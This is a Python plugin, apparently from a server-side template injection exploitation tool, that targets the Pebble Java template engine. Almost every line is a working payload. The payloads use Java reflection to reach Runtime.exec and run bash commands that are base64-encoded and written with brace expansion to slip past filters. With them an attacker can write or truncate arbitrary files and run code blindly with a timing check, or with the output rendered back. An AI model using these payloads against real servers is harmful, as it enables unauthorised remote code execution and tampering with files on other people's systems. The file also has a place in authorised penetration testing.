from utils.loggers import log
from plugins.languages import java
from utils.strings import quote
import re


class Pebble(java.Java):
    
    def init(self):

        self.update_actions({
            'render' : {
                'render': '{{ %(code)s }}',
                'header': '{{ %(header)s }}',
                'trailer': '{{ %(trailer)s }}',
                'test_render': """{{ 'a'.toUPPERCASE() }}""",
                'test_render_expected': 'A'
            },
            'write' : {
                'call' : 'inject',
                'write' : """{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s') }}""",
                'truncate' : """{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,-n,}>%(path)s') }}""",
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}') }}"""
            },
            'execute' : {
                'call': 'render',
                'execute': """{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}') }}"""
            }

        })


        self.set_contexts([


            # Text context, no closures
            { 'level': 0 },
        ])
